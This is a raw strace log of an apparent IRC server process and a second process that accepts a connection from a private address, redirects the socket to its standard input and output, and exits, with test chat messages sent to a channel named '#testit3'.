4519  07:37:14.900249 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:37:14.900278 clock_gettime(CLOCK_MONOTONIC, {2644, 717290610}) = 0
4519  07:37:14.900288 gettimeofday({1495625834, 900292}, NULL) = 0
4519  07:37:14.900298 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
11348 07:37:15.007603 <... accept resumed> {sa_family=AF_INET, sin_port=htons(36609), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
11348 07:37:15.007645 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb614f8) = -1 EINVAL (Invalid argument)
11348 07:37:15.007660 _llseek(8, 0, 0xbfb61540, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:15.007672 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb614f8) = -1 EINVAL (Invalid argument)
11348 07:37:15.007683 _llseek(8, 0, 0xbfb61540, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:15.007692 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
11348 07:37:15.007735 close(6)          = 0
11348 07:37:15.007802 dup(8)            = 6
11348 07:37:15.007851 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62398) = -1 EINVAL (Invalid argument)
11348 07:37:15.007896 _llseek(6, 0, 0xbfb623e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:15.007907 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
11348 07:37:15.007945 dup2(6, 1)        = 1
11348 07:37:15.007957 close(6)          = 0
11348 07:37:15.007968 fcntl64(1, F_SETFD, 0) = 0
11348 07:37:15.007978 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62368) = -1 EINVAL (Invalid argument)
11348 07:37:15.007989 _llseek(1, 0, 0xbfb623b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:15.008032 dup(8)            = 6
11348 07:37:15.008044 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62398) = -1 EINVAL (Invalid argument)
11348 07:37:15.008055 _llseek(6, 0, 0xbfb623e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:15.008064 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
11348 07:37:15.008080 dup2(6, 0)        = 0
11348 07:37:15.008090 close(6)          = 0
11348 07:37:15.008099 fcntl64(0, F_SETFD, 0) = 0
11348 07:37:15.008112 fcntl64(0, F_SETFD, 0) = 0
11348 07:37:15.008128 read(0,  <unfinished ...>
4519  07:37:15.008401 <... select resumed> ) = 1 (in [5], left {0, 900000})
4519  07:37:15.008426 clock_gettime(CLOCK_MONOTONIC, {2644, 825439364}) = 0
4519  07:37:15.008440 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:37:15.008467 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:37:15.008488 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:37:15.008504 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:37:15.008538 close(5)          = 0
4519  07:37:15.008553 gettimeofday({1495625835, 8557}, NULL) = 0
4519  07:37:15.008565 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 920000})
4519  07:37:15.079802 clock_gettime(CLOCK_MONOTONIC, {2644, 896811599}) = 0
4519  07:37:15.079807 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:37:15.079832 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079849 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079864 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079878 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079891 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079905 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079918 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079932 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079945 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079965 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079979 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.079992 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080005 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080019 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080032 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080045 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080058 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080071 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080085 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080099 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080112 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080125 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.080156 time(NULL)        = 1495625835
4519  07:37:15.080193 time(NULL)        = 1495625835
4519  07:37:15.080234 gettimeofday({1495625835, 80239}, NULL) = 0
4519  07:37:15.080247 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:37:15.080275 clock_gettime(CLOCK_MONOTONIC, {2644, 897288086}) = 0
4519  07:37:15.080285 gettimeofday({1495625835, 80289}, NULL) = 0
4519  07:37:15.080296 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 660000})
4519  07:37:15.420746 clock_gettime(CLOCK_MONOTONIC, {2645, 237765887}) = 0
4519  07:37:15.420766 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:37:15.420790 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420807 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420822 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420835 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420849 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420862 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420875 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420889 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420902 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420915 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420928 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420942 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420955 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420968 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420981 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.420994 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421007 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421021 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421034 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421043 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421043 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421043 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:15.421043 gettimeofday({1495625835, 421043}, NULL) = 0
4519  07:37:15.421044 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
11348 07:37:15.527722 <... read resumed> "", 4096) = 0
11348 07:37:15.527893 close(8)          = 0
11348 07:37:15.528057 exit_group(0)     = ?
